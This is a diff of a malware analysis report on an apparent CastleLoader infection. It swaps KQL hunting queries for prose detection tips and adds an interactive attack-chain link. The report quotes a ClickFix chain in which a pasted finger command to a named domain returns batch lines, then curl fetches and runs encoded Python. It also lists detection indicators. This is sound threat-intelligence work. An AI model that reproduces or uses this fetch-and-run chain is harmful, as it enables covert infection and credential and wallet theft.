@@ -28,6 +28,8 @@ IMPACT  : Keystroke capture, hidden-desktop remote control, browser, wallet and 
 
 ## Attack Chain
 
+**[Open the interactive attack chain](castleloader-finger-hollowed-agent-chain.html)**: click a step for its evidence and IOCs.
+
 ```
 Win+R paste: cmd /c ... finger <id>@searperfect[.]com → returned lines run as a batch
   → curl IronPython from GitHub → ipyw32 -c (zlib + base64 Python)
@@ -81,31 +83,12 @@ T+16 min crypto-wallet access flagged by the sandbox
 - **The blobs are what the launcher says.** I resolved the 32-number AES key in `index.js` with a parser that only accepts numbers and arithmetic, never running it. Both GCM tags verified, and a wrong key fails outright. High.
 - **The sandbox log is this agent.** The run's log lines (`kbd watcher installed`, `task uploaded`), the version `0.2.109` and the reinstaller mutex are strings in the decrypted PE. High.
 - **The server decided the tasking.** The raw capture decoded with the constant ChaCha key: the empty reply I decoded is `tasks: {}`, and the other differs only in being the same size. High that it was the server; why is unknown.
-- **The family name.** Three services tag it CastleLoader and eleven details match published analysis. Moderate: I haven't seen a public write-up of the agent half.
+- **The family name.** Three services tag it CastleLoader and eleven details match published analysis. Medium: I haven't seen a public write-up of the agent half.
 
 ## Detection
 
-Written for Defender XDR Advanced Hunting. They also run in Sentinel where the Defender XDR connector streams the table.
-
-```kql
-// ClickFix: finger.exe fetching a script; it is rarely run on purpose
-// Status: untested
-DeviceProcessEvents
-| where FileName =~ "finger.exe"
-| project Timestamp, DeviceName, AccountName, ProcessCommandLine,
-          InitiatingProcessFileName, InitiatingProcessCommandLine
-```
-
-```kql
-// node.exe in ProgramData starting another node.exe: launcher to hollowed child
-// Status: untested
-DeviceProcessEvents
-| where FileName =~ "node.exe" and FolderPath startswith @"C:\ProgramData\"
-| where InitiatingProcessFileName =~ "node.exe"
-| project Timestamp, DeviceName, AccountName, FolderPath, ProcessCommandLine,
-          InitiatingProcessCommandLine, InitiatingProcessParentFileName
-```
-
+- `finger.exe` running at all is worth an alert: it is rarely run on purpose, and here its output was executed as a batch.
+- A `node.exe` under `C:\ProgramData\` that starts another `node.exe` is the launcher and its hollowed child.
 - Compare a `node.exe` in memory with its file on disk: the agent's copies had far more loaded modules (87) than the launcher (40).
 - A `node.exe` that opens a WebSocket to `/api/v1/agent/ws` on a rare domain is the agent talking.
 - NetSupport `client32.exe` running from `C:\ProgramData\...\Network`, started by a scheduled task, with a gateway on port 725.
